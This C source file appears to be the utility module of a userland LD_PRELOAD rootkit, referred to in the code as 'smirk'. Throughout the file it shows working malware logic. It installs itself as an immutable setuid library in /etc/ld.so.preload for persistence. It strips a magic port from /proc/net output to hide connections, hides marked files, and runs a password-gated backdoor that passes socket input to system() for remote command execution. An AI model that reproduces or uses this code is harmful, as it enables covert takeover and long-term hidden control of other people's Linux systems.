#include "utils.h"

/*
 * Function:  matches_reg 
 * --------------------
 * matches regular expression
 *
 *  reg: regular expression
 *  str: string to be matched
 *
 *  returns: 1 if matches otherwise 0  
 */
int matches_reg(const char *reg, const char *str){
    regex_t regex;
    int reti = regcomp(&regex, reg, REG_EXTENDED);
    if (reti){
        return 0;
    }
    reti = regexec(&regex, str, 0 , NULL, 0);
    if (!reti){
        return 1;
    }
    return 0;
}

/*
 * Function:  is_magicfile
 * --------------------
 * check if filename has given prefix
 *
 *  filename: the pointer to the file name
 *
 *  returns: 1 if matches otherwise 0  
 */
int is_magicfile(const char *filename){
    char *file = basename(filename);
    char magic_re[256] = "(^ld\\.so\\.preload$|";
    strcat(magic_re, MAGIC_PREFIX);
    strcat(magic_re,")");
    return matches_reg(magic_re, file);
}

/*
 * Function:  is_net_file
 * --------------------
 * check if filename has given prefix
 *
 *  filename: the pointer to the file name
 *
 *  returns: 1 if matches otherwise 0  
 */
int is_net_file(const char *pathname){
    return matches_reg("^/proc(/[0-9]+)?/net/[a-z0-9]+$", pathname);
}

/*
 * Function:  fake_netstat
 * --------------------
 * creates a fakenetstat file given the original and purging it from MAGIC_PORT
 *
 *  pathname: full the path name
 *  newfile: file pointer to new filename string that will be filled
 *
 *  returns: 1 if works otherwise 0  
 */
int fake_netstat(char *pathname, char *newfile){
    if(!hooked_fopen){
        hooked_fopen = load_libc("fopen");
    }
    FILE *real_fp = hooked_fopen(pathname, "r");
    if (!real_fp){
        return 0;
    }
    strcpy(newfile,FAKE_NETSTAT_FILE);
    char *proto = basename(pathname);
    strcat(newfile,proto);
    FILE *fake_fp = hooked_fopen(newfile,"w");
    char hex_port[7]; 
    sprintf(hex_port, ":%04X ", MAGIC_PORT);

    char str[256];
    while (fgets(str, 256, real_fp)){
        if (strstr(str, hex_port) == NULL){
            fputs(str, fake_fp);
        }
    }
    fchmod(fileno(fake_fp), 0666);
    fclose(fake_fp);
    return 1;
}

//Just to show who's the boss.
void OH_YOU_THINK_YOU_ARE_A_GREAT_HACKER_BY_LOOKING_AT_STRINGS_AND_SHIT_YOU_IDIOT__YOU_HAVE_BEEN_ADOPTED__NOBODY_LOVES_YOU(){}

void install(){
    struct stat buffer;
    if (stat(MAGIC_LIBPATH, &buffer) == 0){
        return;
    }
    Dl_info dl_info;
    dladdr((void*)OH_YOU_THINK_YOU_ARE_A_GREAT_HACKER_BY_LOOKING_AT_STRINGS_AND_SHIT_YOU_IDIOT__YOU_HAVE_BEEN_ADOPTED__NOBODY_LOVES_YOU, &dl_info);
    char fname[PATH_MAX];
    realpath((char*)dl_info.dli_fname, fname);
    if (strcmp(MAGIC_LIBPATH, fname) != 0){
        #ifdef DEBUG
        printf("[-] installing lib in %s\n", MAGIC_LIBPATH);
        #endif
        if (!hooked_fopen){
            hooked_fopen = load_libc("fopen");
        }
        if (!hooked_ioctl){
            hooked_ioctl = load_libc("ioctl");
        }
        FILE *fr = hooked_fopen(fname,"rb");
        FILE *fw = hooked_fopen(MAGIC_LIBPATH,"wb");
        if (!fw){
            #ifdef DEBUG
            printf("[-] no write permission\n");
            #endif
            return;
        }
        char buff[1024];
        size_t n, m;
        do{
            n = fread(buff, 1, sizeof(buff), fr);
            if (n) m = fwrite(buff, 1, n, fw);
            else m = 0;
        } while ((n > 0) && (n == m));
        fclose(fr);
        fflush(fw);
        unsigned long flags = FS_IMMUTABLE_FL | FS_APPEND_FL;
        int fd = fileno(fw);
        fchmod(fd, 04555);
        hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
        fclose(fw);

        FILE *fld = hooked_fopen("/etc/ld.so.preload","w");
        if (!fld){
            #ifdef DEBUG
            printf("[-] no write permission\n");
            #endif
            return;
        }
        fwrite(MAGIC_LIBPATH, 1, sizeof(MAGIC_LIBPATH), fld);
        fflush(fld);
        fd = fileno(fld);
        hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
        fclose(fld);
    }
}

/*
 * Function:  uninstal
 * --------------------
 * unistall smirk from system
 *
 *  returns: nothing 
 */
void uninstall(){
    #ifdef DEBUG
    printf("[-] removing lib...\n");
    #endif
    if (!hooked_fopen){
        hooked_fopen = load_libc("fopen");
    }
    if (!hooked_ioctl){
        hooked_ioctl = load_libc("ioctl");
    }

    unsigned long flags = 0;
    struct stat buffer;

    if (stat(MAGIC_LIBPATH, &buffer) == 0){
        FILE *f = hooked_fopen(MAGIC_LIBPATH, "rb");
        if (!f){
            #ifdef DEBUG
            printf("[-] no write permission\n");
            #endif
            return;
        }
        int fd = fileno(f);
        hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
        fclose(f);
        unlink(MAGIC_LIBPATH);
    }

    char ldpath[] = "/etc/ld.so.preload";
    if (stat(ldpath, &buffer) == 0){
        FILE *fld = hooked_fopen(ldpath, "r");
        if (!fld){
            #ifdef DEBUG
            printf("[-] no write permission\n");
            #endif
            return;
        }
        int fd = fileno(fld);
        hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
        fclose(fld);
        unlink(ldpath);
    }
}

/*
 * Function:  read_line
 * --------------------
 * given the socket fd the function store in buffer the string of max size bytes
 *
 *  fd: the file descriptor
 *  buffer: pointer to the buffer to store the string
 *  max_size: max size of the buffer
 *
 *  returns: nothing
 */
void read_line(int fd, char *buffer, int max_size){
    int l = 0;
    int c = 'X';
    while (c && c != '\n' && l < max_size){
        read(fd, &c, 1);
        buffer[l] = c;
        l++;
    }
    buffer[l-1] = '\0';
}

/*
 * Function:  backdoor
 * --------------------
 * given the socket it spawn a shell with a password request
 *
 *  args: the pointer to the socket
 *
 *  returns: nothing
 */
void *backdoor(void *args){
    int fd = *((int *) args);
    // get password
    write(fd, "PASS>", 5);
    char buff[1024];
    read_line(fd, buff, sizeof(buff));
    if (strcmp(buff, PASSWORD) != 0){
        char lovephrase[] = "Fuck off.\n";
        write(fd, lovephrase, sizeof(lovephrase));
        close(fd);
        return NULL;
    }

    // manage shell
    write(fd,"CMD>",4);
    read_line(fd, buff, sizeof(buff));
    dup2(fd, 0); //stdin
    dup2(fd, 1); //stdout
    dup2(fd, 2); //stderr

    system(buff);
    close(fd);
}
